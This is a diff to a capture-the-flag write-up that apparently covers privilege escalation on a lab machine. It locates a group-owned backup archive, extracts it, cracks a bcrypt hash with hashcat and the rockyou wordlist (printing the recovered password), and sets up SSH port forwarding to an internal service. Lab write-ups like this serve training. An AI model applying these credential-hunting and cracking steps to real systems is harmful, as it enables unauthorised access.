@@ -109,7 +109,7 @@ uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
 
 We look for files/directories with sysadm ownership:
 ```bash 
-ls -la / | grep sysadm
+ls -la / | grep -n10 sysadm
 ```
 ```
 265127-/var/backups:
@@ -123,9 +123,9 @@ ls -la / | grep sysadm
 265135--rw-r--r-- 1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
 265136:-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
 ```
-We find a file called `backrest_backup.tar.gz` owned by `root:sysadm`. It looks like a compressed backup file. We can extract it to see its contents:
+We find a file called `/var/backups/backrest_backup.tar.gz` owned by `root:sysadm`. It looks like a compressed backup file. We can extract it to see its contents:
 ```bash
-tar -xvf backrest_backup.tar.gz
+tar -xvf /var/backups/backrest_backup.tar.gz
 ```
 ```
 backrest/
@@ -180,7 +180,8 @@ Bcrypt is an algorithm used for hashing passwords. The password for the user `ba
 hashcat -m 3200 password.txt /usr/share/wordlists/rockyou.txt
 ```
 ```
-$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
+hash: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
+password: !@#$%^
 ```
 
 We find that there is a backrest service running on internal port 9898. We can use `ssh` to port forward this port to our local machine:
